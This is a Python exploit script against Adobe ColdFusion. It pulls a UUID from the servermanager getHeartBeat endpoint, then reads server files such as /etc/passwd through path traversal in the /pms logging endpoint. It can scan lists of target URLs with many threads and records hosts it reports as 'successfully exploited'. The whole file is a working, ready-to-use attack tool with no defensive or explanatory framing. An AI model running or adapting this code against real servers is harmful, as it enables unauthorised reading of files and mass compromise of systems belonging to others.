import os
import re
import urllib3
import requests
import argparse

from rich.console import Console
from alive_progress import alive_bar
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings()


class ColdFusionExploit:
    def __init__(self, output_file):
        self.output_file = output_file
        self.console = Console()
        self.verbose = True

    def custom_print(self, message: str, header: str) -> None:
        header_colors = {"+": "green", "-": "red", "!": "yellow", "*": "blue"}
        self.console.print(
            f"[bold {header_colors.get(header, 'white')}][{header}][/bold {header_colors.get(header, 'white')}] {message}"
        )

    def get_uuid(self, url):
        endpoint = (
            "/CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat"
        )
        try:
            response = requests.get(f"{url}{endpoint}", verify=False, timeout=10)
            if response.status_code == 200:
                repattern = r"<var name='uuid'><string>(.+?)</string></var>"
                search_results = re.findall(repattern, response.text)
                if search_results:
                    uuid = search_results[0]
                    if uuid:
                        if self.verbose:
                            self.custom_print(f"UUID retrieved for {url}: {uuid}", "+")
                        return uuid
                else:
                    if self.verbose:
                        self.custom_print(f"No UUID found for {url}.", "-")
        except Exception as e:
            if self.verbose:
                self.custom_print(f"Error retrieving UUID for {url}: {e}", "-")
        return None

    def test_files(self, url, uuid):
        files_to_test = {
            "Linux": "etc/passwd",
            "Windows": "Windows/ServerStandardEval.xml",
        }
        headers = {"uuid": uuid}
        vulnerable = False
        for os_name, file_path in files_to_test.items():
            if self.verbose:
                self.custom_print(f"Testing {os_name} file {file_path} for {url}.", "*")
            endpoint = f"/pms?module=logging&file_name=../../../../../../../{file_path}&number_of_lines=100"
            response = requests.get(
                f"{url}{endpoint}", verify=False, headers=headers, timeout=10
            )
            if response.status_code == 200 and response.text.strip() != "[]":
                vulnerable = True
                self.custom_print(f"Success: {url} - OS detected: {os_name}", "+")
                if self.verbose:
                    print(response.text)
                if self.output_file:
                    with open(self.output_file, "a") as file:
                        file.write(f"{url} - Successfully exploited. OS: {os_name}\n")
                break
        if not vulnerable and self.verbose:
            self.custom_print(f"{url} does not appear to be vulnerable.", "-")
        return vulnerable

    def exploit(self, url):
        uuid = self.get_uuid(url)
        if uuid:
            self.test_files(url, uuid)

    def scan_from_file(self, target_file, threads):
        self.verbose = False
        if not os.path.exists(target_file):
            print(f"File not found: {target_file}")
            return

        with open(target_file, "r") as file:
            urls = [line.strip() for line in file.readlines() if line.strip()]

        with alive_bar(len(urls), title="Scanning Targets", enrich_print=False) as bar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = [executor.submit(self.exploit, url) for url in urls]
                for _ in as_completed(futures):
                    bar()


def arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="Single URL to scan")
    parser.add_argument("-f", "--file", help="File containing the list of URLs to scan")
    parser.add_argument("-o", "--output", help="File to write vulnerable instances")
    parser.add_argument(
        "-t",
        "--threads",
        type=int,
        default=50,
        help="Number of concurrent threads for scanning (default: 50)",
    )
    return parser.parse_args()


def main():
    args = arguments()
    exploit = ColdFusionExploit(args.output)
    if args.url:
        exploit.exploit(args.url)
    elif args.file:
        exploit.scan_from_file(args.file, args.threads)
    else:
        print("Please provide a URL (-u) or a file (-f) containing URLs.")


if __name__ == "__main__":
    main()
